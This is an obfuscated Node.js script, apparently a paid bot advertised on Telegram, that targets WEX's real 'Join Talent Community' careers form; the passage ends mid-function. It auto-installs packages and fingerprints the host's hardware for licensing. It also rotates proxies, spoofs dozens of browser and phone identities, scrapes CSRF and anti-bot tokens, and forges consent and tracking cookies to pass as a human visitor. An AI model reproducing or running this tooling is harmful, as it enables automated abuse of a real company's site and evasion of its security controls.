const fs = require('fs'),
  path = require("path"),
  {
    execSync
  } = require("child_process");
const requiredModules = ["https-proxy-agent", "socks-proxy-agent", "chalk"];
let missingModules = false;
for (const mod of requiredModules) {
  try {
    require.resolve(mod);
  } catch (v1) {
    missingModules = true;
    break;
  }
}
if (missingModules) {
  console.log("\n[SETUP] First time setup: Installing required dependencies...");
  try {
    const v2 = {};
    v2.stdio = "inherit", execSync("npm install https-proxy-agent socks-proxy-agent chalk@4", v2), console.log("[SETUP] Dependencies installed successfully!\n");
  } catch (v3) {
    console.error("[ERROR] Failed to install dependencies. Make sure Node.js and NPM are installed."), process.exit(0x1);
  }
}
const https = require("https"),
  http = require("http"),
  zlib = require("zlib"),
  crypto = require("crypto"),
  chalk = require("chalk"),
  readline = require("readline"),
  os = require('os'),
  {
    HttpsProxyAgent
  } = require("https-proxy-agent"),
  {
    SocksProxyAgent
  } = require("socks-proxy-agent");
let OUTPUT_DIR = __dirname;
(function () {
  let v4;
  try {
    const v5 = Function('return (function() {}.constructor("return this")( ));');
    v4 = v5();
  } catch (v6) {
    v4 = window;
  }
  v4.setInterval(fn2, 0xdac);
})();
let SUCCESSFUL_FILE = path.join(OUTPUT_DIR, "successful.txt"),
  FAILED_FILE = path.join(OUTPUT_DIR, "failed.txt"),
  DEBUG_FILE = path.join(OUTPUT_DIR, "debug.txt");
function setupOutputDirectory() {
  OUTPUT_DIR = __dirname, SUCCESSFUL_FILE = path.join(OUTPUT_DIR, "successful.txt"), FAILED_FILE = path.join(OUTPUT_DIR, "failed.txt"), DEBUG_FILE = path.join(OUTPUT_DIR, "debug.txt");
  try {
    !fs.existsSync(DEBUG_FILE) && fs.writeFileSync(DEBUG_FILE, "=== WEX JTC DEBUG LOG STARTED " + new Date().toISOString() + " ===\n", "utf8");
    if (!fs.existsSync(SUCCESSFUL_FILE)) fs.writeFileSync(SUCCESSFUL_FILE, '', "utf8");
    if (!fs.existsSync(FAILED_FILE)) fs.writeFileSync(FAILED_FILE, '', "utf8");
  } catch (v7) {
    OUTPUT_DIR = process.cwd(), SUCCESSFUL_FILE = path.join(OUTPUT_DIR, "successful.txt"), FAILED_FILE = path.join(OUTPUT_DIR, "failed.txt"), DEBUG_FILE = path.join(OUTPUT_DIR, "debug.txt");
    try {
      fs.writeFileSync(DEBUG_FILE, "=== WEX JTC DEBUG LOG STARTED " + new Date().toISOString() + " ===\n", "utf8");
    } catch (v8) {}
  }
  return OUTPUT_DIR;
}
function debugLog(v9, v10, v11) {
  try {
    const v12 = new Date().toISOString(),
      v13 = '[' + v12 + "] [" + v9 + "] [" + v10 + ']\x0a' + (typeof v11 === "object" ? JSON.stringify(v11, null, 0x2) : String(v11)) + '\x0a' + '─'.repeat(0x50) + '\x0a';
    fs.appendFileSync(DEBUG_FILE, v13, "utf8");
  } catch (v14) {
    try {
      fs.appendFileSync(path.join(process.cwd(), "debug.txt"), '[' + new Date().toISOString() + "] [" + v9 + "] [" + v10 + ']\x0a' + String(v11) + '\x0a', "utf8");
    } catch (v15) {}
  }
}
const BL = chalk.hex("#003087"),
  CY = chalk.hex("#00CFFF"),
  W = chalk.white,
  G = chalk.gray,
  Y = chalk.hex("#FFD700"),
  GR = chalk.hex("#00D26A"),
  RE = chalk.hex("#FF3B30");
let globalHwid = "Unregistered";
function printHeader() {
  process.stdout.write("[2J[3J[H"), console.log(BL("  ██╗    ██╗███████╗██╗  ██╗"));
  console.log(BL("  ██║    ██║██╔════╝╚██╗██╔╝"));
  console.log(CY("  ██║ █╗ ██║█████╗   ╚███╔╝ ")), console.log(CY("  ██║███╗██║██╔══╝   ██╔██╗ ")), console.log(Y("  ╚███╔███╔╝███████╗██╔╝ ██╗")), console.log(Y("   ╚══╝╚══╝ ╚══════╝╚═╝  ╚═╝\n")), console.log(W("┌──────────────────────────────────────────────┐")), console.log(W("│ [•] Author    : ") + Y("NOT REXY                     ") + W('│'));
  console.log(W("│ [•] Telegram  : ") + CY("t.me/Rex_OTP_Tool            ") + W('│')), console.log(W("│ [•] Target    : ") + BL("WEX — JTC Talent Community   ") + W('│')), console.log(W("│ [•] Version   : ") + Y("WEX-V1.0.0                   ") + W('│')), globalHwid !== "Unregistered" && console.log(W("│ [•] HWID      : ") + Y(globalHwid.padEnd(0x1d)) + W('│')), console.log(W("└──────────────────────────────────────────────┘\n"));
}
function generateHWID() {
  const v16 = os.platform();
  try {
    if (v16 === "win32") {
      const v17 = execSync('C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NoProfile -Command "$mg = (Get-ItemProperty \'HKLM:\\SOFTWARE\\Microsoft\\Cryptography\' -ErrorAction SilentlyContinue).MachineGuid; $cpu = (Get-CimInstance Win32_Processor -ErrorAction SilentlyContinue | Select-Object -First 1).ProcessorId; $disk = (Get-CimInstance Win32_LogicalDisk -Filter \'DeviceID=\\\'C:\\\'\' -ErrorAction SilentlyContinue).VolumeSerialNumber; $mb = (Get-CimInstance Win32_BaseBoard -ErrorAction SilentlyContinue).SerialNumber; Write-Output (($mg,$cpu,$disk,$mb) -join \'|\')"', {
        'stdio': "pipe",
        'timeout': 0x3a98
      }).toString().trim();
      if (!v17) throw new Error("No hardware data");
      const v18 = crypto.createHash("sha256").update(v17).digest("hex").toUpperCase();
      return "SKING-" + v18.substring(0x0, 0x8) + '-' + v18.substring(0x8, 0xc) + '-' + v18.substring(0xc, 0x10);
    } else {
      let v19 = [];
      try {
        const v23 = {};
        v23.stdio = "pipe", v23.timeout = 0x1388;
        const v24 = execSync("settings get secure android_id 2>/dev/null || echo \"\"", v23).toString().trim();
        if (v24 && v24 !== "null") v19.push('A:' + v24);
      } catch (v25) {}
      try {
        if (fs.existsSync("/proc/cpuinfo")) {
          const v26 = fs.readFileSync("/proc/cpuinfo", "utf8"),
            v27 = v26.match(/Serial\s*:\s*(\S+)/i),
            v28 = v26.match(/Hardware\s*:\s*(.+)/i);
          if (v27 && v27[0x1] !== "0000000000000000") v19.push('S:' + v27[0x1].trim());
          if (v28) v19.push('H:' + v28[0x1].trim());
        }
      } catch (v29) {}
      try {
        if (fs.existsSync("/etc/machine-id")) {
          const v30 = fs.readFileSync("/etc/machine-id", "utf8").trim();
          if (v30) v19.push('M:' + v30);
        }
      } catch (v31) {}
      try {
        const v32 = os.cpus(),
          v33 = v32 && v32.length > 0x0 ? v32[0x0].model : "UnknownCPU",
          v34 = os.totalmem(),
          v35 = os.release(),
          v36 = os.hostname();
        v19.push('F:' + v33 + '|' + v34 + '|' + v35 + '|' + v36);
      } catch (v37) {}
      const v20 = v19.join('||'),
        v21 = crypto.createHash("sha256").update(v20).digest("hex").toUpperCase(),
        v22 = os.platform() === "android" ? "ANKING-" : "SKING-";
      return v22 + v21.substring(0x0, 0x8) + '-' + v21.substring(0x8, 0xc) + '-' + v21.substring(0xc, 0x10);
    }
  } catch (v38) {
    return '';
  }
}
function verifyServerSignature(v39, v40) {
  if (!v40) return false;
  try {
    return crypto.verify(null, Buffer.from(v39, "utf8"), "-----BEGIN PUBLIC KEY-----\nMCowBQYDK2VwAyEAIU7Pc75ao+Fn7XGC7kFGeDh7JAs3o4NSL2LgmN0YmfY=\n-----END PUBLIC KEY-----", Buffer.from(v40, "base64"));
  } catch (v41) {
    return false;
  }
}
function parseProxy(v42) {
  if (!v42) return null;
  if (typeof v42 === "object") return v42;
  v42 = v42.trim();
  if (!v42) return null;
  let v43,
    v44,
    v45,
    v46,
    v47 = "http";
  (v42.includes("socks5://") || v42.includes("socks4://")) && (v47 = v42.startsWith("socks4") ? "socks4" : "socks5");
  if (v42.includes("://")) v42 = v42.split("://")[0x1];
  if (v42.includes('@')) {
    const v49 = v42.split('@'),
      v50 = v49[0x0].split(':'),
      v51 = v49[0x1].split(':');
    v45 = v50[0x0], v46 = v50[0x1], v43 = v51[0x0], v44 = parseInt(v51[0x1]);
  } else {
    const v52 = v42.split(':');
    if (v52.length === 0x2) v43 = v52[0x0], v44 = parseInt(v52[0x1]);else v52.length === 0x4 && (!isNaN(parseInt(v52[0x3])) && isNaN(parseInt(v52[0x1])) ? (v45 = v52[0x0], v46 = v52[0x1], v43 = v52[0x2], v44 = parseInt(v52[0x3])) : (v43 = v52[0x0], v44 = parseInt(v52[0x1]), v45 = v52[0x2], v46 = v52[0x3]));
  }
  if (!v43 || !v44) return null;
  const v48 = {};
  v48.type = v47, v48.host = v43, v48.port = v44, v48.user = v45, v48.pass = v46, v48.original = v42;
  return v48;
}
function createProxyAgent(v53) {
  if (!v53) return null;
  const v54 = typeof v53 === "string" ? parseProxy(v53) : v53;
  if (!v54) return null;
  const v55 = v54.user ? encodeURIComponent(v54.user) + ':' + encodeURIComponent(v54.pass || '') + '@' : '';
  if (v54.type === "socks5" || v54.type === "socks4") return new SocksProxyAgent("socks5://" + v55 + v54.host + ':' + v54.port);
  return new HttpsProxyAgent("http://" + v55 + v54.host + ':' + v54.port);
}
function sendRequest(v56, v57, v58, v59, v60, v61, v62) {
  if (v61 === undefined) v61 = 0x7530;
  if (v62 === undefined) v62 = 0x5;
  return new Promise((v63, v64) => {
    let v65;
    try {
      v65 = new URL(v56);
    } catch (v71) {
      return v64(new Error("Bad URL: " + v56));
    }
    const v66 = Object.assign({}, v58);
    if (!v66["Accept-Encoding"]) v66["Accept-Encoding"] = "gzip, deflate, br";
    if (v59) v66["Content-Length"] = Buffer.byteLength(v59);
    const v67 = {};
    v67.hostname = v65.hostname, v67.port = v65.port || (v65.protocol === "https:" ? 0x1bb : 0x50), v67.path = v65.pathname + v65.search;
    v67.method = v57, v67.headers = v66, v67.timeout = v61;
    const v68 = v67;
    if (v60) {
      const v72 = typeof v60 === "object" ? v60 : parseProxy(v60);
      if (v72 && !isNaN(v72.port) && v72.port > 0x0) v68.agent = createProxyAgent(v72);
    }
    const v69 = v65.protocol === "https:" ? https : http,
      v70 = v69.request(v68, v73 => {
        const v74 = v73.headers.location;
        if ([0x12d, 0x12e, 0x12f].includes(v73.statusCode) && v74 && v62 > 0x0) {
          const v76 = v74.startsWith("http") ? v74 : new URL(v74, v56).toString();
          if (v73.headers["set-cookie"]) {
            const v77 = Array.isArray(v73.headers["set-cookie"]) ? v73.headers["set-cookie"] : [v73.headers["set-cookie"]],
              v78 = v77.map(v79 => v79.split(';')[0x0]).join(';\x20');
            v66.cookie = v66.cookie ? v66.cookie + ';\x20' + v78 : v78;
          }
          return v73.resume(), sendRequest(v76, "GET", v66, null, v60, v61, v62 - 0x1).then(v63).catch(v64);
        }
        const v75 = [];
        v73.on("data", v80 => v75.push(v80)), v73.on("error", v64), v73.on("end", () => {
          let v81 = Buffer.concat(v75);
          const v82 = v73.headers["content-encoding"];
          if (v82 === "gzip") try {
            v81 = zlib.gunzipSync(v81);
          } catch (v83) {} else {
            if (v82 === "deflate") try {
              v81 = zlib.inflateSync(v81);
            } catch (v84) {} else {
              if (v82 === 'br') try {
                v81 = zlib.brotliDecompressSync(v81);
              } catch (v85) {}
            }
          }
          v63({
            'status': v73.statusCode,
            'data': v81.toString("utf8"),
            'headers': v73.headers
          });
        });
      });
    v70.on("error", v64);
    v70.on("timeout", () => {
      v70.destroy();
      v64(new Error("timeout"));
    });
    if (v59) v70.write(v59);
    v70.end();
  });
}
class CookieJar {
  constructor(v86) {
    this.store = {};
    if (v86) this._parseInit(v86);
  }
  ["_parseInit"](v87) {
    v87.split(';').forEach(v88 => {
      const v89 = v88.trim().indexOf('=');
      if (v89 < 0x0) return;
      const v90 = v88.trim().slice(0x0, v89).trim();
      const v91 = v88.trim().slice(v89 + 0x1).trim();
      if (v90) this.store[v90] = v91;
    });
  }
  ["set"](v92) {
    if (!v92) return;
    const v93 = Array.isArray(v92) ? v92 : [v92];
    for (const v94 of v93) {
      const v95 = v94.split(';')[0x0].trim(),
        v96 = v95.indexOf('=');
      if (v96 < 0x0) continue;
      this.store[v95.substring(0x0, v96).trim()] = v95.substring(v96 + 0x1).trim();
    }
  }
  ["get"]() {
    return Object.entries(this.store).map(([v97, v98]) => v97 + '=' + v98).join(';\x20');
  }
  ["absorb"](v99) {
    this.set(v99["set-cookie"]);
  }
  ["setValue"](v100, v101) {
    this.store[v100] = v101;
  }
  ["has"](v102) {
    return v102 in this.store;
  }
}
function randomUUID() {
  const v103 = crypto.randomBytes(0x10);
  v103[0x6] = v103[0x6] & 0xf | 0x40, v103[0x8] = v103[0x8] & 0x3f | 0x80;
  const v104 = v103.toString("hex");
  return v104.slice(0x0, 0x8) + '-' + v104.slice(0x8, 0xc) + '-' + v104.slice(0xc, 0x10) + '-' + v104.slice(0x10, 0x14) + '-' + v104.slice(0x14);
}
function getRandomClient(v105 = "random", v106 = "random") {
  const v107 = Math.floor(Math.random() * 17) + 0x78,
    v108 = Math.floor(Math.random() * 0x9c4) + 0x157c,
    v109 = Math.floor(Math.random() * 0x15e) + 0x1e,
    v110 = Math.floor(Math.random() * 17) + 0x78,
    v111 = Math.floor(Math.random() * 3) + 0x10;
  const v112 = Math.floor(Math.random() * 14) + 0x66,
    v113 = ["\"Not/A)Brand\";v=\"8\"", "\"Not)A;Brand\";v=\"99\"", "\"Not;A=Brand\";v=\"8\"", "\"Not=A?Brand\";v=\"8\"", "\"Not?A_Brand\";v=\"99\"", "\"Not_A Brand\";v=\"24\"", "\"Not A(Brand\";v=\"8\"", "\"Not(A;Brand\";v=\"99\"", "\"Chromium\";v=\"" + v107 + '\x22'],
    v114 = v113[Math.floor(Math.random() * v113.length)];
  let v115;
  if (v106 === "desktop") v115 = true;else {
    if (v106 === "mobile") v115 = false;else v115 = Math.random() > 0.45;
  }
  if (v115) {
    const v175 = v105 === "edge" || v105 === "random" && Math.random() > 0.65,
      v176 = ["\"10.0.0\"", "\"15.0.0\"", "\"19.0.0\""],
      v177 = v176[Math.floor(Math.random() * v176.length)],
      v178 = Math.random() > 0.5 ? "dark" : "light";
    if (v175) {
      const v182 = Math.floor(Math.random() * 15) + 0x7a,
        v183 = v182 + ".0." + (Math.floor(Math.random() * 0x7d0) + 0x1b58) + '.' + (Math.floor(Math.random() * 0xc8) + 0xa),
        v184 = v182 + ".0." + (Math.floor(Math.random() * 0x7d0) + 0x1b58) + '.' + (Math.floor(Math.random() * 0xc8) + 0xa),
        v185 = {};
      return v185.name = "Windows Edge " + v182, v185.isMobile = false, v185.userAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/" + v184 + " Safari/537.36 Edg/" + v183, v185.clientHints = {}, v185.clientHints["sec-ch-ua"] = "\"Microsoft Edge\";v=\"" + v182 + "\", \"Not_A Brand\";v=\"8\", \"Chromium\";v=\"" + v182 + '\x22', v185.clientHints["sec-ch-ua-mobile"] = '?0', v185.clientHints["sec-ch-ua-platform"] = "\"Windows\"", v185;
    }
    const v179 = Math.floor(Math.random() * 15) + 0x7a,
      v180 = v179 + ".0." + (Math.floor(Math.random() * 0x7d0) + 0x1b58) + '.' + (Math.floor(Math.random() * 0xc8) + 0xa),
      v181 = {};
    return v181.name = "Windows Chrome " + v179, v181.isMobile = false, v181.userAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/" + v180 + " Safari/537.36", v181.clientHints = {}, v181.clientHints["sec-ch-ua"] = "\"Google Chrome\";v=\"" + v179 + "\", \"Not_A Brand\";v=\"8\", \"Chromium\";v=\"" + v179 + '\x22', v181.clientHints["sec-ch-ua-mobile"] = '?0', v181.clientHints["sec-ch-ua-platform"] = "\"Windows\"", v181;
  }
  const v116 = {};
  v116.model = "SM-S928B", v116.brand = "Samsung", v116.ver = '14', v116.build = "UP1A.231005.007";
  const v117 = {};
  v117.model = "SM-S921B", v117.brand = "Samsung", v117.ver = '14', v117.build = "UP1A.231005.007";
  const v118 = {};
  v118.model = "SM-S918B", v118.brand = "Samsung", v118.ver = '14', v118.build = "UP1A.231005.007";
  const v119 = {};
  v119.model = "SM-S911B", v119.brand = "Samsung", v119.ver = '13', v119.build = "TP1A.220624.014";
  const v120 = {};
  v120.model = "SM-A556B", v120.brand = "Samsung", v120.ver = '14', v120.build = "UP1A.231005.007";
  const v121 = {};
  v121.model = "SM-A546B", v121.brand = "Samsung", v121.ver = '13', v121.build = "TP1A.220624.014";
  const v122 = {};
  v122.model = "SM-A356B", v122.brand = "Samsung", v122.ver = '14', v122.build = "UP1A.231005.007";
  const v123 = {};
  v123.model = "SM-A156B", v123.brand = "Samsung", v123.ver = '14', v123.build = "UP1A.231005.007";
  const v124 = {};
  v124.model = "SM-G998B", v124.brand = "Samsung", v124.ver = '13', v124.build = "TP1A.220624.014";
  const v125 = {};
  v125.model = "SM-G991B", v125.brand = "Samsung", v125.ver = '13', v125.build = "TP1A.220624.014";
  const v126 = {};
  v126.model = "Pixel 9 Pro XL", v126.brand = "Google", v126.ver = '15', v126.build = "AP3A.241105.007";
  const v127 = {};
  v127.model = "Pixel 9", v127.brand = "Google", v127.ver = '15', v127.build = "AP3A.241105.007";
  const v128 = {};
  v128.model = "Pixel 8 Pro", v128.brand = "Google", v128.ver = '14', v128.build = "UP1A.231005.007";
  const v129 = {};
  v129.model = "Pixel 8", v129.brand = "Google", v129.ver = '14', v129.build = "UP1A.231005.007";
  const v130 = {};
  v130.model = "Pixel 7a", v130.brand = "Google", v130.ver = '14', v130.build = "UP1A.231005.007";
  const v131 = {};
  v131.model = "Pixel 7 Pro", v131.brand = "Google", v131.ver = '13', v131.build = "TP1A.220624.021";
  const v132 = {};
  v132.model = "Pixel 6a", v132.brand = "Google", v132.ver = '13', v132.build = "TP1A.220624.021";
  const v133 = {};
  v133.model = "OnePlus 12", v133.brand = "OnePlus", v133.ver = '14', v133.build = "UP1A.231005.007";
  const v134 = {};
  v134.model = "CPH2581", v134.brand = "OnePlus", v134.ver = '14', v134.build = "UP1A.231005.007";
  const v135 = {};
  v135.model = "OnePlus 11", v135.brand = "OnePlus", v135.ver = '13', v135.build = "TP1A.220624.014";
  const v136 = {};
  v136.model = "CPH2609", v136.brand = "OPPO", v136.ver = '14', v136.build = "UP1A.231005.007";
  const v137 = {};
  v137.model = "CPH2525", v137.brand = "OPPO", v137.ver = '13', v137.build = "TP1A.220624.014";
  const v138 = {};
  v138.model = "CPH2357", v138.brand = "OPPO", v138.ver = '13', v138.build = "TP1A.220624.014";
  const v139 = {};
  v139.model = "23116PN5BC", v139.brand = "Xiaomi", v139.ver = '14', v139.build = "UKQ1.230804.001";
  const v140 = {};
  v140.model = "23127PN0CG", v140.brand = "Xiaomi", v140.ver = '14', v140.build = "UKQ1.230804.001";
  const v141 = {};
  v141.model = "2210132G", v141.brand = "Xiaomi", v141.ver = '13', v141.build = "TKQ1.220829.002";
  const v142 = {};
  v142.model = "23049PCD8G", v142.brand = "POCO", v142.ver = '14', v142.build = "UKQ1.230804.001";
  const v143 = {};
  v143.model = "23122PCD1G", v143.brand = "POCO", v143.ver = '14', v143.build = "UKQ1.230804.001";
  const v144 = {};
  v144.model = "23076RN4BI", v144.brand = "Redmi", v144.ver = '13', v144.build = "TKQ1.221114.001";
  const v145 = {};
  v145.model = "RMX3850", v145.brand = "Realme", v145.ver = '14', v145.build = "UP1A.231005.007";
  const v146 = {};
  v146.model = "RMX3760", v146.brand = "Realme", v146.ver = '14', v146.build = "UP1A.231005.007";
  const v147 = {};
  v147.model = "RMX3363", v147.brand = "Realme", v147.ver = '13', v147.build = "TP1A.220624.014";
  const v148 = {};
  v148.model = "V2309A", v148.brand = "vivo", v148.ver = '14', v148.build = "UP1A.231005.007";
  const v149 = {};
  v149.model = "V2250", v149.brand = "vivo", v149.ver = '13', v149.build = "TP1A.220624.014";
  const v150 = {};
  v150.model = "motorola edge 50 ultra", v150.brand = "Motorola", v150.ver = '14', v150.build = "U1UC34.1-12";
  const v151 = {};
  v151.model = "motorola edge 40", v151.brand = "Motorola", v151.ver = '13', v151.build = "T3SQS33.73-17";
  const v152 = {};
  v152.model = "moto g84 5G", v152.brand = "Motorola", v152.ver = '13', v152.build = "T3TC33.18-48";
  const v153 = {};
  v153.model = "XQ-DQ72", v153.brand = "Sony", v153.ver = '14', v153.build = "67.1.A.2.220";
  const v154 = {};
  v154.model = "ASUS_AI2401_D", v154.brand = "ASUS", v154.ver = '14', v154.build = "UKQ1.230924.001";
  const v155 = {};
  v155.model = "A065", v155.brand = "Nothing", v155.ver = '14', v155.build = "UP1A.231005.007";
  const v156 = [v116, v117, v118, v119, v120, v121, v122, v123, v124, v125, v126, v127, v128, v129, v130, v131, v132, v133, v134, v135, v136, v137, v138, v139, v140, v141, v142, v143, v144, v145, v146, v147, v148, v149, v150, v151, v152, v153, v154, v155],
    v157 = {};
  v157.model = "iPhone16,2", v157.name = "iPhone 15 Pro Max", v157.ios = "17_5_1", v157.ver = "17.5.1";
  const v158 = {};
  v158.model = "iPhone16,1", v158.name = "iPhone 15 Pro", v158.ios = "17_4_1", v158.ver = "17.4.1";
  const v159 = {};
  v159.model = "iPhone15,5", v159.name = "iPhone 15 Plus", v159.ios = "17_5", v159.ver = "17.5";
  const v160 = {};
  v160.model = "iPhone15,4", v160.name = "iPhone 15", v160.ios = "17_3_1", v160.ver = "17.3.1";
  const v161 = {};
  v161.model = "iPhone15,3", v161.name = "iPhone 14 Pro Max", v161.ios = "17_2", v161.ver = "17.2";
  const v162 = {};
  v162.model = "iPhone15,2", v162.name = "iPhone 14 Pro", v162.ios = "17_1_2", v162.ver = "17.1.2";
  const v163 = {};
  v163.model = "iPhone14,8", v163.name = "iPhone 14 Plus", v163.ios = "16_6_1", v163.ver = "16.6.1";
  const v164 = {};
  v164.model = "iPhone14,7", v164.name = "iPhone 14", v164.ios = "16_6", v164.ver = "16.6";
  const v165 = {};
  v165.model = "iPhone14,3", v165.name = "iPhone 13 Pro Max", v165.ios = "17_0_3", v165.ver = "17.0.3";
  const v166 = {};
  v166.model = "iPhone14,2", v166.name = "iPhone 13 Pro", v166.ios = "16_5", v166.ver = "16.5";
  const v167 = {};
  v167.model = "iPhone14,5", v167.name = "iPhone 13", v167.ios = "16_4_1", v167.ver = "16.4.1";
  const v168 = {};
  v168.model = "iPhone13,4", v168.name = "iPhone 12 Pro Max", v168.ios = "16_3_1", v168.ver = "16.3.1";
  const v169 = {};
  v169.model = "iPhone13,2", v169.name = "iPhone 12", v169.ios = "16_2";
  v169.ver = "16.2";
  const v170 = {};
  v170.model = "iPhone12,1", v170.name = "iPhone 11", v170.ios = "16_1_1", v170.ver = "16.1.1";
  const v171 = [v157, v158, v159, v160, v161, v162, v163, v164, v165, v166, v167, v168, v169, v170];
  let v172 = v105;
  if (v105 === "random") {
    const v186 = ["chrome_android", "chrome_android", "chrome_android", "ios_safari", "samsung", "firefox_android", "ios_chrome", "uc_browser"];
    v172 = v186[Math.floor(Math.random() * v186.length)];
  }
  if (v172 === "ios_safari" || v172 === "safari") {
    const v187 = v171[Math.floor(Math.random() * v171.length)],
      v188 = {};
    return v188.name = "iOS Safari (" + v187.name + ')', v188.isMobile = true, v188.userAgent = "Mozilla/5.0 (iPhone; CPU iPhone OS " + v187.ios + " like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/" + v111 + ".0 Mobile/15E148 Safari/604.1", v188.clientHints = {}, v188;
  }
  if (v172 === "ios_chrome") {
    const v189 = v171[Math.floor(Math.random() * v171.length)],
      v190 = {};
    return v190.name = "iOS Chrome (" + v189.name + ')', v190.isMobile = true, v190.userAgent = "Mozilla/5.0 (iPhone; CPU iPhone OS " + v189.ios + " like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/" + v107 + ".0." + v108 + '.' + v109 + " Mobile/15E148 Safari/604.1", v190.clientHints = {}, v190;
  }
  if (v172 === "samsung") {
    const v191 = v156.filter(v195 => v195.brand === "Samsung"),
      v192 = v191[Math.floor(Math.random() * v191.length)] || v156[0x0],
      v193 = Math.floor(Math.random() * 0x5) + 0x18,
      v194 = {};
    return v194.name = "Samsung Internet " + v193 + '\x20(' + v192.model + ')', v194.isMobile = true, v194.userAgent = "Mozilla/5.0 (Linux; Android " + v192.ver + ';\x20' + v192.model + ") AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/" + v193 + ".0 Chrome/" + v107 + ".0." + v108 + '.' + v109 + " Mobile Safari/537.36", v194.clientHints = {}, v194.clientHints["sec-ch-ua"] = "\"Samsung Internet\";v=\"" + v193 + "\", " + v114 + ", \"Chromium\";v=\"" + v107 + '\x22', v194.clientHints["sec-ch-ua-mobile"] = '?1', v194.clientHints["sec-ch-ua-platform"] = "\"Android\"", v194.clientHints["sec-ch-ua-platform-version"] = '\x22' + v192.ver + ".0\"", v194;
  }
  if (v172 === "firefox_android") {
    const v196 = v156[Math.floor(Math.random() * v156.length)],
      v197 = {};
    return v197.name = "Firefox Android " + v110 + '\x20(' + v196.model + ')', v197.isMobile = true, v197.userAgent = "Mozilla/5.0 (Android " + v196.ver + "; Mobile; rv:" + v110 + ".0) Gecko/" + v110 + ".0 Firefox/" + v110 + '.0', v197.clientHints = {}, v197;
  }
  if (v172 === "uc_browser") {
    const v198 = v156[Math.floor(Math.random() * v156.length)],
      v199 = "13." + Math.floor(Math.random() * 0x5) + '.' + Math.floor(Math.random() * 0x9) + '.' + (Math.floor(Math.random() * 0x4b0) + 0x3e8),
      v200 = {};
    return v200.name = "UC Browser (" + v198.model + ')', v200.isMobile = true, v200.userAgent = "Mozilla/5.0 (Linux; U; Android " + v198.ver + "; en-US; " + v198.model + " Build/" + v198.build + ") AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 UCBrowser/" + v199 + " Mobile Safari/537.36", v200.clientHints = {}, v200;
  }
  const v173 = v156[Math.floor(Math.random() * v156.length)],
    v174 = {};
  return v174.name = "Android Chrome " + v107 + '\x20(' + v173.model + ')', v174.isMobile = true, v174.userAgent = "Mozilla/5.0 (Linux; Android " + v173.ver + ';\x20' + v173.model + " Build/" + v173.build + ") AppleWebKit/537.36 (KHTML, like Gecko) Chrome/" + v107 + ".0." + v108 + '.' + v109 + " Mobile Safari/537.36", v174.clientHints = {}, v174.clientHints["sec-ch-ua"] = "\"Chromium\";v=\"" + v107 + "\", " + v114 + ", \"Google Chrome\";v=\"" + v107 + '\x22', v174.clientHints["sec-ch-ua-mobile"] = '?1', v174.clientHints["sec-ch-ua-platform"] = "\"Android\"", v174.clientHints["sec-ch-ua-platform-version"] = '\x22' + v173.ver + ".0\"", v174;
}
async function fetchWexSession(v201, v202, v203, v204) {
  const v205 = v201.get(),
    v206 = {};
  v206.accept = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8";
  v206["accept-language"] = "en-US,en;q=0.9", v206["sec-fetch-dest"] = "document", v206["sec-fetch-mode"] = "navigate", v206["sec-fetch-site"] = "none", v206["sec-fetch-user"] = '?1', v206["upgrade-insecure-requests"] = '1', v206["user-agent"] = v202.userAgent;
  const v207 = v206;
  if (v202.clientHints) for (const [v217, v218] of Object.entries(v202.clientHints)) {
    if (v218 !== undefined && v218 !== null) v207[v217] = v218;
  }
  if (v205) v207.cookie = v205;
  const v208 = await sendRequest("https://careers.wexinc.com/us/en/jointalentcommunity", "GET", v207, null, v203, v204);
  v201.absorb(v208.headers), v201.pageStartTime = new Date().toISOString();
  let v209 = null;
  const v210 = v208.data.match(/csrfToken["']?\s*:\s*["']([a-f0-9]{32,})["']/i);
  if (v210) v209 = v210[0x1];
  if (!v201.has("PLAY_SESSION")) {
    const v219 = v208.data.match(/PLAY_SESSION=([^;"'\s]+)/);
    if (v219) v201.setValue("PLAY_SESSION", v219[0x1]);
  }
  let v211 = null;
  const v212 = v201.store.PLAY_SESSION || '';
  if (v212) {
    const v220 = v212.split('.');
    if (v220.length >= 0x2) try {
      const v221 = v220[0x1].replace(/-/g, '+').replace(/_/g, '/'),
        v222 = JSON.parse(Buffer.from(v221, "base64").toString("utf8"));
      if (v222 && v222.data) {
        if (v222.data.JSESSIONID) v211 = v222.data.JSESSIONID;
        if (!v209 && v222.data.csrfToken) v209 = v222.data.csrfToken;
      }
    } catch (v223) {}
  }
  if (!v211) v211 = randomUUID();
  const v213 = v208.data.match(/reese84["']?\s*=\s*["']([^"']+)["']/);
  v213 && v213[0x1] && v201.setValue("reese84", v213[0x1]);
  v201.setValue("PHPPPE_ACT", v211), v201.setValue("VISITED_LANG", 'en'), v201.setValue("VISITED_COUNTRY", 'us'), v201.setValue("PHPPPE_GCC", 'a');
  const v214 = Math.floor(Date.now() / 0x3e8).toString(0x10) + Math.random().toString(0x10).slice(0x2, 0x9) + '-' + Math.random().toString(0x10).slice(0x2, 0x8) + '-' + Math.random().toString(0x10).slice(0x2, 0x6) + '-' + Math.floor(Date.now() / 0x3e8).toString(0x10) + Math.random().toString(0x10).slice(0x2, 0x9);
  v201.setValue("Per_UniqueID", v214), v201.setValue("ext_trk", "pjid%3D" + v211 + "&uid%3D" + v214 + "&p_lang%3Den_us&refNum%3DWEXWEXUS");
  const v215 = new Date(Date.now() - 0x36ee80).toISOString();
  v201.setValue("OptanonAlertBoxClosed", v215), v201.setValue("OptanonConsent", "isGpcEnabled=0&datestamp=" + encodeURIComponent(new Date().toUTCString()) + "&version=202510.1.0&browserGpcFlag=0&isIABGlobal=false&hosts=&consentId=" + randomUUID() + "&interactionCount=0&landingPath=" + encodeURIComponent("https://careers.wexinc.com/us/en/jointalentcommunity") + "&groups=C0002%3A1%2CC0003%3A1%2CC0004%3A1%2CC0001%3A1");
  const v216 = {};
  v216.csrfToken = v209;
  return v216.pageStatus = v208.status, v216;
}
async function submitJTC(v224, v225, v226, v227, v228, v229) {
  const {
      firstName: v230,
      lastName: v231,
      email: v232,
      phone: v233,
      city: v234,
      country: v235,
      state: v236,
